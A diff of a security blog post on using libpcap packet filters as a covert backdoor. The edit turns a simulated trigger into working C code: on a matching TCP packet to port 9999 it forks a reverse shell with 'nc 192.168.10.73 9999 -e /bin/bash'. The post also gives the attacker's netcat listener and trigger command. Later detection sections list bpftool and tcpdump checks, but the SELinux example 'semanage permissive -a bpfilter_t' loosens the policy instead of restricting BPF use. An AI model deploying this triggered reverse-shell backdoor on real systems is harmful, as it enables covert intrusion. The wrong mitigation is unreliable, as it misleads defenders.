@@ -17,10 +17,12 @@ Once an adversary compromises a system, they may seek to maintain persistence th
 
 **libpcap-dev installation**
    `sudo apt install libpcap-dev`
+This program will now capture TCP packets on port 9999 and print a message when it detects a match. Upon detecting the packet, it will trigger the reverse shell activation by connecting to the attacker
 
     #include <pcap.h>
     #include <stdio.h>
     #include <stdlib.h>
+    #include <unistd.h>
     
     // Declare the packet handler function before main
     void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet);
@@ -29,7 +31,7 @@ Once an adversary compromises a system, they may seek to maintain persistence th
         char errbuf[PCAP_ERRBUF_SIZE];
         pcap_t *handle;
     
-        // Open network interface for packet capture
+        // Open the network interface for packet capture (adjust interface name)
         handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf); // Adjust the interface name
         if (handle == NULL) {
             fprintf(stderr, "Error opening device: %s\n", errbuf);
@@ -38,7 +40,7 @@ Once an adversary compromises a system, they may seek to maintain persistence th
     
         // Set a filter for TCP traffic on port 9999 (reverse shell port)
         struct bpf_program fp;
-        char filter_exp[] = "tcp port 9999";
+        char filter_exp[] = "tcp port 9999";  // Port for reverse shell
         if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
             fprintf(stderr, "Error compiling filter\n");
             return 1;
@@ -63,14 +65,17 @@ Once an adversary compromises a system, they may seek to maintain persistence th
         printf("Captured a packet matching the filter!\n");
         printf("Packet Length: %d bytes\n", pkthdr->len);
     
-        // Simulate reverse shell activation
-        printf("Simulating reverse shell activation...\n");
+        // Simulate reverse shell activation (spawning a shell)
+        printf("Initiating reverse shell...\n");
     
-        // Additional actions can be triggered here based on packet contents
+        // Execute reverse shell: Connect back to attacker (adjust the IP address)
+        if (fork() == 0) {
+            execlp("/bin/bash", "bash", "-i", "-c", "nc 192.168.10.73 9999 -e /bin/bash", (char *)NULL);
+            exit(0);
+        }
     }
 
 
-This code uses **libpcap** to set a filter that monitors for TCP packets on port 9999. The adversary could tailor the filter to match specific conditions, ensuring that only traffic related to their backdoor is processed. Once the filter is set, no immediate actions will be visible, which makes detection harder.
 
 **Compile the program**
    `gcc -o packet_capture packet_capture.c -lpcap`
@@ -78,22 +83,25 @@ This code uses **libpcap** to set a filter that monitors for TCP packets on port
 **Run the program**
    `sudo ./packet_capture`
 
-
+![Packet Filter & capture](/assets/img/socket-filters/packet_capture.png)
 #### **2. Sending Crafted Packets to Trigger Reverse Shell**
 
-Once the filter is active, the adversary can send a specially crafted packet to the compromised system that matches the filter criteria (i.e., TCP traffic on port 9999). This packet would not just match the filter but also trigger a **reverse shell** or **command invocation** based on the filter's configured actions.
-
-For instance, using **netcat** or another tool, the attacker may initiate a reverse shell connection through the specified port:
+The attacker needs to listen for incoming reverse shell connections and send a packet to the victim to trigger the filter.
 
 
 **Set up the Reverse Shell Listener on adversary**
    `nc -lvnp 9999`
 
+This will listen on port 9999 for incoming connections, allowing the attacker to receive the reverse shell once it's triggered.
+
 
 ***Send a Packet to Trigger the Filter on victim machine***
-`nc -e /bin/bash <attacker-ip> 9999` 
+`echo "Test" | nc -w 1 victim-ip 9999` 
 
-This command establishes a reverse shell to the attacker's machine, and since the filter is set to listen on port 9999, it will trigger the reverse shell activation when the packet is received.
+![Packet Filter & capture](/assets/img/socket-filters/shell.png)
+The attacker needs to send a packet to the victim's machine that matches the BPF filter. Use Netcat to send a simple packet.This packet will match the filter.
+
+This simulation demonstrates how an attacker can use packet filters to trigger a reverse shell without needing to maintain an active connection. By understanding how packet filters work and how they can be leveraged by adversaries, security professionals can better detect and prevent such attacks. The use of packet filters to monitor specific ports can be an effective persistence mechanism for attackers, which makes detecting these activities crucial for securing systems.
 
 #### **3. Triggering Command Shell or Implant Installation**
 
@@ -112,12 +120,17 @@ The lack of visible network activity and the use of low-overhead socket operatio
 
 ### **Detection and Mitigation Techniques**
 
+
 #### **A. Monitoring and Auditing Network Interfaces**
 
 To detect the use of socket filters for covert backdoor activations, network administrators can monitor for suspicious BPF programs or unusual socket activity. Tools like **bpftool** can list active BPF programs attached to network interfaces, which can help identify abnormal or unauthorized filters.
 
-
 **Check for BPF programs attached to network interfaces**
+
+bash
+
+Copy code
+
 `sudo bpftool prog show` 
 
 This can identify any filters that have been installed on the system, such as those attached to port 9999 for reverse shell activation.
@@ -128,9 +141,13 @@ Adversary-driven packet filters often utilize hidden or non-standard ports for c
 
 For example, using **tcpdump** to capture traffic on port 9999 can help detect attempts to trigger backdoors or implants.
 
+_**Capturing traffic on port 9999**_
 
-***Capturing traffic on port 9999***
-`sudo tcpdump -i eth0 port 9999`
+bash
+
+Copy code
+
+`sudo tcpdump -i eth0 port 9999` 
 
 #### **C. Kernel Auditing and System Integrity Checks**
 
@@ -140,7 +157,11 @@ Monitoring the integrity of the system kernel can help detect unauthorized filte
 
 Restricting access to the ability to attach socket filters can help prevent adversaries from deploying them. Using system hardening techniques, such as configuring **SELinux** or **AppArmor**, can limit access to the relevant system calls or BPF functionalities.
 
-***SELinux policy to restrict BPF program usage***
+_**SELinux policy to restrict BPF program usage**_
+
+bash
+
+Copy code
 
 `semanage permissive -a bpfilter_t` 
 
@@ -150,5 +171,4 @@ Advanced EDR tools can help detect unusual processes and activities associated w
 
 ### **Conclusion**
 
-The use of socket filters for covert backdoor activation and command and control is a powerful evasion technique used by adversaries. By exploiting ***libpcap*** or ***Winpcap***, attackers can create custom filters that monitor specific traffic and trigger malicious actions, such as reverse shells or implant installations, when certain criteria are met. Defenders must be vigilant in monitoring network interfaces, analyzing traffic patterns, and implementing security measures to detect and mitigate such attacks before they can cause damage.
-
+The use of socket filters for covert backdoor activation and command and control is a powerful evasion technique used by adversaries. By exploiting _**libpcap**_ or _**Winpcap**_, attackers can create custom filters that monitor specific traffic and trigger malicious actions, such as reverse shells or implant installations, when certain criteria are met. Defenders must be vigilant in monitoring network interfaces, analyzing traffic patterns, and implementing security measures to detect and mitigate such attacks before they can cause damage.
